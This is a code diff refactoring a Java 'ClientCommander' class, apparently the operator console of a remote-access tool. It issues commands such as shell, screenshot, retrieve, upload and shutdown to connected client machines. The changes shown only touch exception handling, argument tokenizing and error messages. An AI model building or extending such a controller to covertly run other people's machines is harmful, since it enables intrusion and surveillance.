@@ -33,22 +33,13 @@ public class ClientCommander implements Runnable
 
     public void run()
     {
-        try
-        {
-            waitForCommand();
-
-        }
-        catch(NullCommandException | IOException excp)
-        {
-            System.out.println("run() clientcommander exception");
-            excp.printStackTrace();
-        }
+        waitForCommand();
     }
 
     /**
      * waits for the user of the server to type a command
      */
-    private void waitForCommand() throws NullCommandException, IOException
+    private void waitForCommand()
     {
         while(true)
         {
@@ -85,16 +76,12 @@ public class ClientCommander implements Runnable
         Pattern regex = Pattern.compile("[^\\s\"']+|\"([^\"]*)\"|'([^']*)'"); // allows quoted args to be treated as one
         Matcher regexMatcher = regex.matcher(fullCommand);
         while (regexMatcher.find()) {
-            if (regexMatcher.group(1) != null) {
-                // Add double-quoted string without the quotes
+            if (regexMatcher.group(1) != null) // Add double-quoted string without the quotes
                 commandTokens.add(regexMatcher.group(1));
-            } else if (regexMatcher.group(2) != null) {
-                // Add single-quoted string without the quotes
+            else if (regexMatcher.group(2) != null) // Add single-quoted string without the quotes
                 commandTokens.add(regexMatcher.group(2));
-            } else {
-                // Add unquoted word
+            else // Add unquoted word
                 commandTokens.add(regexMatcher.group());
-            }
         }
         return commandTokens;
     }
@@ -120,19 +107,27 @@ public class ClientCommander implements Runnable
         }
     }
 
+    /**
+     * used to find a client from an IP address
+     * @param ipAddress the supplied IP address of the client wanting to be returned
+     * @return a ConnectedClient that has the supplied IP address
+     * @throws UnknownHostException if the IP address didn't match any online clients IP addresses
+     */
     private ConnectedClient getClientFromIPAddress(String ipAddress) throws UnknownHostException
     {
-        return connectedClients.get(InetAddress.getByName(ipAddress));
+        ConnectedClient client = connectedClients.get(InetAddress.getByName(ipAddress));
+        if(client == null)
+            throw new UnknownHostException("[!] Unknown client: " + ipAddress);
+        return client;
     }
 
     /**
      * processes one argument commands, e.g. sysinfo, retrieve, screenshot, eject, shutdown, restart, help, mini, lsprocs, shell
      * @param cmd the command itself, e.g. count
      * @param arg argument for the command
-     * @throws UnknownHostException if the supplied IP address doesn't match any online clients
      * @throws IOException if something went wrong printing os info via sysinfo
      */
-    private void processOneArgCommand(String cmd, String arg) throws UnknownHostException, IOException
+    private void processOneArgCommand(String cmd, String arg) throws IOException
     {
         if(cmd.equals(CMD_HELP))
         {
@@ -165,10 +160,9 @@ public class ClientCommander implements Runnable
      * @param cmd the command itself, e.g. sound
      * @param host the IP address of the host to perform the command on, or all
      * @param arg an argument for the command
-     * @throws UnknownHostException if the client couldn't be found from the supplied IP address
      * @throws IOException if something went wrong sending the file (if the cmd needed to) to the client
      */
-    private void processTwoArgCommand(String cmd, String host, String arg) throws UnknownHostException, IOException
+    private void processTwoArgCommand(String cmd, String host, String arg) throws IOException
     {
         File toSend = null;
         if(cmd.equals(CMD_SOUND) || cmd.equals(CMD_WALLPAPER) || cmd.equals(CMD_UPLOAD))
@@ -297,7 +291,7 @@ public class ClientCommander implements Runnable
         }
         catch(UnknownHostException uhe)
         {
-            System.out.println("Unknown host provided. Try running online to see if the client is online");
+            System.out.println(uhe.getMessage());
         }
         catch(IOException ioe)
         {
